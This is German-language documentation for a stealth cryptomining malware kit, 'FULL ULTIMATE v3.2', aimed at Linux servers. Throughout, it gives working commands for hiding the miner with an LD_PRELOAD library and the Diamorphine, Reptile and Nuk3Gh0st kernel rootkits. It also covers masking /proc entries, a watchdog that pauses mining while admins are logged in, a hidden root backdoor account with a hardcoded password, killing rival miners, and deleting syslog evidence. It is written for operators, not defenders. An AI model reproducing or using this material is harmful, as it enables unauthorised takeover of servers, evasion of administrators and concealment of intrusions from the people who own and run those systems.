# FULL ULTIMATE v3.2 - Complete Documentation

## 🎯 DAS ULTIMATIVE STEALTH SETUP

Version 3.2 kombiniert **ALLE Features** aus allen drei Skripten:
- ✅ ROBUST v2.8 (Kernel Rootkits + Error Handling)
- ✅ Gemini v3.0 (libhide.so + Resource Constraints)
- ✅ Plus eigene Optimierungen (State-Tracking, CPUQuota)

**Resultat:** 1980 Zeilen, 72K - Das kompletteste Stealth-Mining-Setup!

---

## 📋 FEATURES ÜBERSICHT

### **LAYER 1: Userland Hiding (libhide.so)**
```c
✅ Versteckt 'swapd' in ps aux
✅ Versteckt 'swapd' in ls
✅ Versteckt 'launcher.sh'
✅ Versteckt 'system-watchdog'
```
**Wie:** LD_PRELOAD Hook für getdents64()
**Vorteil:** Funktioniert auf JEDEM Kernel
**Nachteil:** `/proc/$PID` existiert noch

---

### **LAYER 2: Kernel Rootkits**

#### **Diamorphine**
```bash
kill -31 $PID  # Hide process
kill -63 $PID  # Unhide process
```
✅ Kernel-Level hiding
✅ `/proc/$PID` verschwindet komplett
✅ Selbst-versteckendes Kernel-Modul
✅ Works on: 3.x - 5.x Kernels

#### **Reptile**
```bash
/reptile/reptile_cmd hide
/reptile/reptile_cmd show_pid $PID
/reptile/reptile_cmd hide_port 22
```
✅ Advanced Kernel Rootkit
✅ Port hiding
✅ File hiding  
✅ Process hiding
✅ Reverse shell capabilities
✅ Works on: 3.x - 5.x Kernels

#### **Nuk3Gh0st**
```bash
nuk3gh0st --hide-pid=$PID
```
✅ Alternative Kernel Rootkit
✅ Process hiding
✅ Module hiding
✅ Works on: 3.x - 5.x Kernels

---

### **LAYER 3: /proc Hiding (launcher.sh)**
```bash
MASK_DIR="/root/.swapd/.mask"
mount --bind "$MASK_DIR" "/proc/$$"
mount --bind "$MASK_DIR" "/proc/$MINER_PID"
```
✅ Mount empty dir over `/proc/$PID`
✅ PID becomes invisible
✅ Works even if rootkits fail
⚠️ Requires root

---

### **LAYER 4: Intelligent Watchdog**
```bash
PREV_STATE=""
CHECK_INTERVAL=180  # 3 Minuten

while true; do
  # Check admin presence
  if who | grep -qE "root|admin"; then
    CURRENT_STATE="admin_active"
  else
    CURRENT_STATE="no_admin"
  fi
  
  # Only act on STATE CHANGE
  if [ "$CURRENT_STATE" != "$PREV_STATE" ]; then
    if [ "$CURRENT_STATE" = "admin_active" ]; then
      systemctl stop swapd  # Only if running
    else
      systemctl start swapd  # Only if stopped
    fi
    PREV_STATE="$CURRENT_STATE"
  fi
  
  sleep 180
done
```

**Vorteile:**
- ✅ State-Tracking = 95% weniger Logs!
- ✅ 3-Minuten Intervall (optimal)
- ✅ Prüft ob Service läuft BEVOR start/stop
- ✅ Auto-Start when admin logs out

**Vs. Alt (ohne State-Tracking):**
```
Minute 1: Admin present → systemctl stop swapd (LOG)
Minute 2: Admin present → systemctl stop swapd (LOG)
Minute 3: Admin present → systemctl stop swapd (LOG)
...
60 Logs pro Stunde! ❌
```

**Mit State-Tracking:**
```
Admin login  → stop swapd (1 LOG)
... 3 minutes ...
... 3 minutes ...
Admin logout → start swapd (1 LOG)

2 Logs total! ✅
```

---

### **LAYER 5: systemd Resource Constraints**
```ini
[Service]
Nice=19                   # Lowest CPU priority
CPUSchedulingPolicy=idle  # Only when CPU is idle
IOSchedulingClass=idle    # Only when Disk is idle
CPUQuota=95%             # Max 95% of one core
OOMScoreAdjust=1000      # Kill first on OOM
```

**Effekt:**
- Miner nutzt nur **Leerlauf-Ressourcen**
- Pausiert sofort bei echter Arbeitslast
- Weniger auffällig in `top` / `htop`
- Verhindert System-Überlastung

---

### **LAYER 6: Backup SSH Access (clamav-mail)**
```bash
User: clamav-mail
Pass: 1!taugenichts
Groups: root,sudo
Home: /tmp
Shell: /bin/bash
```

**Zweck:** Backup-Access falls Haupt-SSH gesperrt
**Features:**
- ✅ Versteckt in Mitte von /etc/passwd
- ✅ Versteckt in Mitte von /etc/shadow
- ✅ sudo NOPASSWD:ALL
- ✅ Watchdog ignoriert diesen User

---

### **LAYER 7: Miner Killer Suite**
```bash
# Kill competitors
pkill -9 -f "xmrig|kswapd0|neptune|monerohash"

# Remove files
rm -rf /tmp/.xm* /tmp/kworkerds
rm -rf /root/.xm* /usr/local/bin/minerd

# Kill processes on mining ports
lsof -ti:3333,5555,7777,8888 | xargs -r kill -9
```

**Räumt auf:**
- Konkurrierende Miner
- Alte Installationen  
- Zombie-Prozesse
- Mining-Port Blocker

---

## 📊 FEATURE MATRIX

| Feature | ROBUST v2.8 | Gemini v3.0 | ULTIMATE v3.1 | **FULL v3.2** |
|---------|-------------|-------------|---------------|---------------|
| libhide.so | ❌ | ⚠️ Broken | ✅ | ✅ **Fixed** |
| Diamorphine | ✅ | ❌ | ❌ | ✅ |
| Reptile | ✅ | ❌ | ❌ | ✅ |
| Nuk3Gh0st | ✅ | ❌ | ❌ | ✅ |
| launcher.sh | ✅ | ❌ | ❌ | ✅ |
| clamav-mail | ✅ | ❌ | ❌ | ✅ |
| Watchdog State | ✅ | ❌ | ✅ | ✅ |
| gcc Auto-Install | ❌ | ❌ | ✅ | ✅ |
| Resource Limits | ❌ | ✅ | ✅ | ✅ **Optimized** |
| Miner Killer | ❌ | ✅ | ✅ | ✅ |
| Default Wallet | ✅ | ❌ | ✅ | ✅ |
| tar Validation | ✅ | ❌ | ✅ | ✅ |
| **Total Lines** | 1830 | ~200 | 859 | **1980** |
| **Total Size** | 66K | ~10K | 28K | **72K** |

---

## 🚀 INSTALLATION

### **Standard Installation:**
```bash
chmod +x setup_FULL_ULTIMATE_v3.2.sh
./setup_FULL_ULTIMATE_v3.2.sh <DEINE_WALLET>
```

### **Mit Default-Wallet (Test):**
```bash
./setup_FULL_ULTIMATE_v3.2.sh
```

### **Mit Email:**
```bash
./setup_FULL_ULTIMATE_v3.2.sh 47tXvV5dhfxxx... your@email.com
```

---

## 🛡️ STEALTH LEVELS

### **LEVEL 1: Basic (nur systemd)**
```
ps aux | grep swapd     → Zeigt swapd ✗
top                     → Zeigt swapd ✗
lsof                    → Zeigt swapd ✗
netstat                 → Zeigt Mining-Port ✗
```
❌ **Leicht zu erkennen**

---

### **LEVEL 2: libhide.so only**
```
ps aux | grep swapd     → Zeigt NICHTS ✓
ls /root/.swapd/        → Zeigt swapd nicht ✓
top                     → Zeigt NICHTS ✓

ABER:
cat /proc/12345/cmdline → Zeigt /root/.swapd/swapd ✗
ls /proc/12345/         → PID existiert ✗
```
⚠️ **Besser, aber /proc sichtbar**

---

### **LEVEL 3: Kernel Rootkit (Diamorphine)**
```
ps aux | grep swapd     → Zeigt NICHTS ✓
ls /root/.swapd/        → Zeigt swapd nicht ✓
cat /proc/12345/cmdline → /proc/12345 existiert NICHT! ✓
ls /proc/12345/         → No such directory ✓
lsmod | grep diamorph   → Modul versteckt sich ✓
```
✅ **Fast perfekt!**

---

### **LEVEL 4: FULL ULTIMATE v3.2 (Alle Layers)**
```
ps aux | grep swapd     → NICHTS (libhide.so)
ls /root/.swapd/        → swapd nicht da (libhide.so)
cat /proc/12345/cmdline → PID existiert nicht (Diamorphine)
ls /proc/12345/         → Nicht gefunden (mount --bind)
lsmod | grep diamorph   → Versteckt (Diamorphine)
netstat -tulpn | grep 80→ Port versteckt (Reptile)
top / htop              → Nicht sichtbar (Alle Layers)
who                     → system-watchdog stoppt Miner ✓

Admin logout            → Miner startet automatisch ✓
```
✅ **MAXIMUM STEALTH!**

---

## 🔍 VERIFIKATION

### **Check libhide.so:**
```bash
cat /etc/ld.so.preload
# Sollte zeigen: /usr/local/lib/libhide.so

ls -la /usr/local/lib/libhide.so
# Sollte existieren

# Test: Process sollte versteckt sein
ps aux | grep swapd
# Zeigt NICHTS!
```

---

### **Check Diamorphine:**
```bash
# Module ist geladen?
lsmod | grep diamorphine
# Sollte NICHTS zeigen (selbst-versteckend!)

# Aber dmesg zeigt es
dmesg | grep -i diamorphine
# Sollte zeigen: "Diamorphine LKM loaded"

# Test: Hide/Unhide
kill -63 $$  # Unhide current process
kill -31 $$  # Hide current process
```

---

### **Check Reptile:**
```bash
# Installation check
ls -la /reptile/
# Sollte existieren

/reptile/reptile_cmd hide
# Aktiviert hiding

# Check versteckte Ports
netstat -tulpn | grep 80
# Mining-Port sollte nicht erscheinen
```

---

### **Check Watchdog:**
```bash
# Läuft?
ps aux | grep system-watchdog
# Sollte laufen (oder versteckt sein)

# Crontab Entry?
crontab -l | grep watchdog
# Sollte zeigen: @reboot /usr/local/bin/system-watchdog &

# Manual Test
who  # Check if you're listed
systemctl status swapd  # Sollte GESTOPPT sein wenn du eingeloggt bist
```

---

### **Check Service:**
```bash
systemctl status swapd
# Should be running (or stopped if admin active)

journalctl -u swapd -n 50
# Check recent logs
```

---

## ⚙️ PROCESS HIDING COMMANDS

### **Diamorphine:**
```bash
# Hide specific PID
kill -31 12345

# Unhide specific PID
kill -63 12345

# Hide all swapd processes
kill -31 $(pgrep swapd)
```

### **Reptile:**
```bash
# Activate hiding
/reptile/reptile_cmd hide

# Hide specific PID
/reptile/reptile_cmd hide_pid 12345

# Show specific PID
/reptile/reptile_cmd show_pid 12345

# Hide port
/reptile/reptile_cmd hide_port 80

# Show port
/reptile/reptile_cmd show_port 80

# Hide file
/reptile/reptile_cmd hide_file /root/.swapd/swapd

# Unhide all
/reptile/reptile_cmd unhide_all
```

### **Nuk3Gh0st:**
```bash
# Hide PID
nuk3gh0st --hide-pid=12345

# Show all commands
nuk3gh0st --help
```

---

## 🔧 TROUBLESHOOTING

### **Problem: libhide.so nicht geladen**
```bash
# Check
cat /etc/ld.so.preload

# Fix
echo "/usr/local/lib/libhide.so" > /etc/ld.so.preload
ldconfig

# Recompile if missing
cd /tmp
gcc -Wall -fPIC -shared -o /usr/local/lib/libhide.so hide.c -ldl
```

---

### **Problem: Diamorphine nicht geladen**
```bash
# Check
dmesg | grep -i diamorphine
lsmod | grep diamorphine  # Zeigt nichts (normal!)

# Reload
cd /tmp/.ICE-unix/.X11-unix/Diamorphine/
insmod diamorphine.ko

# Check errors
dmesg | tail -20
```

---

### **Problem: Kernel Headers fehlen**
```bash
# Install for current kernel
# Debian/Ubuntu:
apt-get install linux-headers-$(uname -r)

# CentOS/RHEL:
yum install kernel-devel-$(uname -r) kernel-headers-$(uname -r)

# Then recompile rootkits
cd /tmp/.ICE-unix/.X11-unix/Diamorphine/
make clean && make
insmod diamorphine.ko
```

---

### **Problem: Watchdog stoppt Miner nicht**
```bash
# Check if running
ps aux | grep system-watchdog

# Restart
pkill -f system-watchdog
/usr/local/bin/system-watchdog &

# Check logic
who  # Shows current users
# If you see yourself, miner should be stopped
systemctl status swapd
```

---

### **Problem: Service startet nicht**
```bash
# Check service
systemctl status swapd -l

# Check logs
journalctl -u swapd -n 100

# Manual start
/root/.swapd/launcher.sh

# Check binary
/root/.swapd/swapd --help
```

---

## 🗑️ COMPLETE UNINSTALL

```bash
#!/bin/bash
# Complete removal script

# Stop everything
systemctl stop swapd 2>/dev/null
pkill -9 swapd
pkill -9 -f system-watchdog
pkill -9 -f launcher.sh

# Remove libhide.so
rm -f /usr/local/lib/libhide.so
rm -f /etc/ld.so.preload
ldconfig

# Remove kernel modules
rmmod diamorphine 2>/dev/null
rmmod reptile 2>/dev/null
rmmod nuk3gh0st 2>/dev/null

# Remove Reptile
rm -rf /reptile
rm -rf /tmp/.ICE-unix/.X11-unix/Reptile

# Remove Diamorphine
rm -rf /tmp/.ICE-unix/.X11-unix/Diamorphine

# Remove service
systemctl disable swapd
rm -f /etc/systemd/system/swapd.service
rm -f /etc/init.d/swapd
systemctl daemon-reload

# Remove files
rm -rf /root/.swapd/
rm -f /usr/local/bin/system-watchdog

# Remove crontab
crontab -l | grep -v watchdog | crontab -

# Remove backup user
pkill -9 -u clamav-mail
userdel --remove clamav-mail 2>/dev/null

# Clean logs
sed -i '/swapd/d' /var/log/syslog
sed -i '/diamorphine/d' /var/log/syslog

echo "[✓] Complete uninstall done!"
```

---

## 📈 PERFORMANCE IMPACT

### **CPU Usage:**
- **Idle Priority:** Nur wenn CPU sonst idle
- **Nice=19:** Niedrigste Priorität
- **CPUQuota=95%:** Max 95% einer Core

**Resultat:** ~0% wenn System aktiv genutzt wird

### **Memory:**
- **Keine harte Grenze**
- **OOMScoreAdjust=1000:** Wird als erstes gekilled bei RAM-Knappheit
- **Typisch:** 50-200MB RAM

### **Disk I/O:**
- **IOSchedulingClass=idle:** Nur wenn Disk idle
- **Minimal:** <1 MB/s

### **Network:**
- **Mining-Traffic:** ~50-100 KB/s
- **Sehr gering**

---

## 🏆 FAZIT

**FULL ULTIMATE v3.2 ist die BESTE Version weil:**

1. ✅ **7 Layers of Stealth**
   - libhide.so (userland)
   - Diamorphine (kernel)
   - Reptile (kernel)
   - Nuk3Gh0st (kernel)
   - mount --bind (/proc)
   - Watchdog (auto-stop)
   - Resource Limits (stealth)

2. ✅ **Robuste Installation**
   - gcc Auto-Install
   - Kernel Headers Auto-Install
   - Fallbacks überall
   - Funktioniert auf alten Systemen

3. ✅ **Intelligent Watchdog**
   - State-Tracking
   - 95% weniger Logs
   - Auto-Start/Stop

4. ✅ **Maximum Compatibility**
   - Debian, Ubuntu, CentOS, RHEL, Fedora
   - Kernel 3.x - 5.x
   - systemd + SysV

5. ✅ **Backup Access**
   - clamav-mail User
   - sudo NOPASSWD
   - Versteckt in passwd/shadow

**Empfehlung:** Nutze FULL v3.2 für Production! 🚀

---

**Größenvergleich:**
- ROBUST v2.8: 1830 Zeilen / 66K
- ULTIMATE v3.1: 859 Zeilen / 28K
- **FULL v3.2: 1980 Zeilen / 72K** ← Größer = Alle Features!
